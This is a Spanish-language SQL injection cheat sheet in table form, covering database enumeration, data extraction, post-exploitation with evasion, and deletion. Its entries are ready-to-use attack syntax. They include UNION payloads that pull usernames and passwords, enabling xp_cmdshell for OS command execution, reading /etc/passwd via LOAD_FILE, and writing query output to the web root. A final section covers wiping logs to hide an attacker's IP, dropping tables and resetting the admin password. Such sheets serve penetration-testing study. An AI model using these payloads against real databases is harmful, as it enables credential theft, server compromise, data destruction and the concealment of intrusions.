# Enumeración
| **Acción**          | **MySQL / MariaDB**                                                       | **PostgreSQL**                                                            | **SQL Server (MSSQL)**                                                                |
| ------------------- | ------------------------------------------------------------------------- | ------------------------------------------------------------------------- | ------------------------------------------------------------------------------------- |
| **Versión**         | `SELECT @@version`                                                        | `SELECT version()`                                                        | `SELECT @@version`                                                                    |
| **Usuario Actual**  | `SELECT user()`                                                           | `SELECT current_user`                                                     | `SELECT user_name()`                                                                  |
| **Base de Datos**   | `SELECT database()`                                                       | `SELECT current_database()`                                               | `SELECT db_name()`                                                                    |
| **Listar Tablas**   | `SELECT table_name FROM information_schema.tables`                        | `\dt` o `SELECT tablename FROM pg_catalog.pg_tables`                      | `SELECT name FROM sysobjects WHERE xtype='U'`                                         |
| **Listar Columnas** | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` | `SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'X')` |

# Extracción 
| **Técnica / Parámetro** | **Función**                                                      | **Ejemplo de Sintaxis**                                    |
| ----------------------- | ---------------------------------------------------------------- | ---------------------------------------------------------- |
| `UNION SELECT`          | Combina resultados de la consulta original con datos robados.    | `' UNION SELECT null, user, password FROM users --`        |
| `GROUP_CONCAT`          | Concatena múltiples filas en una sola cadena (útil en MySQL).    | `SELECT GROUP_CONCAT(username) FROM users`                 |
| `SUBSTRING`             | Extrae partes de un dato (ideal para SQLi ciega o _Blind_).      | `SELECT SUBSTRING(password,1,1) FROM users WHERE id=1`     |
| `LIMIT / OFFSET`        | Desplaza los resultados para extraer registros uno a uno.        | `SELECT email FROM users LIMIT 1 OFFSET 5`                 |
| `INTO OUTFILE`          | Escribe el resultado de una consulta en un archivo del servidor. | `SELECT * FROM users INTO OUTFILE '/var/www/html/out.txt'` |

# PostExp y evasión
|**Parámetro / Comando**|**Función**|**Ejemplo de Sintaxis**|
|---|---|---|
|`xp_cmdshell`|Ejecuta comandos de SO (Exclusivo MSSQL, requiere privilegios).|`EXEC sp_configure 'xp_cmdshell', 1; EXEC xp_cmdshell 'whoami';`|
|`LOAD_FILE`|Lee el contenido de archivos locales del servidor.|`SELECT LOAD_FILE('/etc/passwd')`|
|`CHAR()`|Evade filtros de comillas usando códigos ASCII.|`SELECT * FROM users WHERE name = CHAR(65,68,77,73,78)`|
|`SLEEP()` / `pg_sleep()`|Introduce retardos para confirmar vulnerabilidades _Time-based_.|`SELECT IF(1=1, SLEEP(5), 0)`|
|`--` , `#` , `/*`|Comentarios para anular el resto de la consulta original.|`' OR 1=1 -- -`|

# Borrado 
| **Acción** | **Función**                                                 | **Ejemplo de Sintaxis**                          |
| ---------- | ----------------------------------------------------------- | ------------------------------------------------ |
| `DELETE`   | Borra registros específicos (deja rastro en logs).          | `DELETE FROM logs WHERE user_id = 'atacker_ip'`  |
| `TRUNCATE` | Borra todos los registros de una tabla rápidamente.         | `TRUNCATE TABLE logs`                            |
| `DROP`     | Elimina la estructura completa de la tabla o base de datos. | `DROP TABLE users`                               |
| `UPDATE`   | Modifica datos existentes (ej. cambiar una contraseña).     | `UPDATE users SET pass='123' WHERE user='admin'` |